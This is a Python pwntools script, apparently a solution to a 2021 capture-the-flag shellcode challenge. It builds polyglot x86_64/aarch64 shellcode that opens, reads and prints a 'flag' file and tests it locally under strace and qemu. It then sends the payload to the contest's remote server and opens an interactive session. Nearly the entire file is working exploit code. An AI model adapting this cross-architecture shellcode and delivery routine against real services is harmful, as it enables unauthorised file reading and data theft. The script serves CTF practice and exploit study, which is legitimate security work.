#!/usr/bin/env python3
import uuid

from pwn import *
from subprocess import check_call, check_output


def main():
    with open("x86_64.S", "w") as fp:
        fp.write(
            """
.intel_syntax noprefix
#define STDOUT_FILENO 1
#define __NR_read 0
#define __NR_write 1
#define __NR_open 2
#define __NR_exit 60
#define O_RDONLY 0
#define BUF_SIZE 128
#define FLAG 276
#define BUF 280
#define BASE 0x77
.globl _start
_start:
mov rax, __NR_open
lea rdi, [rip+_start-BASE+FLAG]
mov rsi, O_RDONLY
syscall
push rax
mov rsi, O_RDONLY
mov rax, __NR_read
pop rdi
lea rsi, [rip+_start-BASE+BUF]
mov rdx, BUF_SIZE
syscall
push rax
mov rax, __NR_write
mov rdi, STDOUT_FILENO
pop rdx
syscall
mov rax, __NR_exit
mov rdi, 0
syscall
"""
        )
    check_call(["gcc", "-o", "x86_64.elf", "x86_64.S", "-nostartfiles"])
    check_call(
        ["objcopy", "-O", "binary", "--only-section=.text", "x86_64.elf", "x86_64.bin"]
    )
    with open("x86_64.bin", "rb") as fp:
        x86_64 = fp.read()
    with open("aarch64.S", "w") as fp:
        fp.write(
            """
#define STDOUT_FILENO 1
#define __NR_openat 56
#define __NR_read 63
#define __NR_write 64
#define __NR_exit 93
#define AT_FDCWD -100
#define O_RDONLY 0
#define BUF_SIZE 128
#define FLAG 276
.align 12
.globl _start
_start:
add x1, x0, FLAG                         /* x0 = shellcode dispatcher@ */
mov w8, __NR_openat
mov w0, AT_FDCWD
mov w2, O_RDONLY
svc 0
mov w8, __NR_read
mov w2, BUF_SIZE
svc 0
mov w2, w0
mov w8, __NR_write
mov w0, STDOUT_FILENO
svc 0
ret
"""
        )
    check_call(
        ["aarch64-linux-gnu-gcc", "-o", "aarch64.elf", "aarch64.S", "-nostartfiles"]
    )
    check_call(
        [
            "aarch64-linux-gnu-objcopy",
            "-O",
            "binary",
            "--only-section=.text",
            "aarch64.elf",
            "aarch64.bin",
        ]
    )
    with open("aarch64.bin", "rb") as fp:
        aarch64 = fp.read()
    shellcode = flat(
        {
            # shellcode dispatcher
            # x86_64: j . + 0x77
            # aarch64: nop
            0: b"\x75\x75\x5D\x50",
            4: aarch64,
            0x77: x86_64,
            276: b"flag",
        }
    )
    with open("shellcode.bin", "wb") as fp:
        fp.write(shellcode)
    flag = uuid.uuid4().hex.encode()
    with open("flag", "wb") as fp:
        fp.write(flag)
    with open("shellcode.bin", "rb") as fp:
        actual = check_output(["strace", "./chal-x86-64"], stdin=fp)
        assert actual == flag, actual
    with open("shellcode.bin", "rb") as fp:
        actual = check_output(
            [
                "env",
                "QEMU_LD_PREFIX=/usr/aarch64-linux-gnu",
                "qemu-aarch64",
                "-strace",
                "./chal-aarch64",
            ],
            stdin=fp,
        )
        assert actual == flag, actual
    with remote("shellcode.2021.ctfcompetition.com", 1337) as tube:
        tube.sendlineafter("Payload:", shellcode)
        tube.interactive()


if __name__ == "__main__":
    main()
